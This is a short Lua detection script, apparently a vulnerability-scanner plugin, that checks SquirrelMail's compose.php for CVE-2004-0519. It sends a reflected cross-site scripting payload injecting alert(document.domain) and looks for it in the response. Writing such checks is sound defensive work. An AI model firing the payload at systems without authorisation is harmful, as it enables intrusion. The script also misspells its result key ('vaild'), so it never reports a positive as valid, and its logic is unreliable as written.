
function main(url)
    found = {}
    found["valid"] = false
    local new_url = urljoin(url,"/mail/src/compose.php?mailbox=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E")
    local resp = send_req(new_url)
    if resp.url:GetStrOrNil() then 
        local body = resp.body:GetStrOrNil()
        if string.find(body,"</script><script>alert(document.domain)</script>") then
            found["url"] = resp.url:GetStrOrNil()
            found["vaild"] = true
            found["match"] = "</script><script>alert(document.domain)</script>"
            found["payload"] = ""
            found["resp"] = resp.body:GetStrOrNil()
            println(string.format("FOUND CVE-2004-0519: %s", resp.url:GetStrOrNil()))
        end
    end
    return found
end
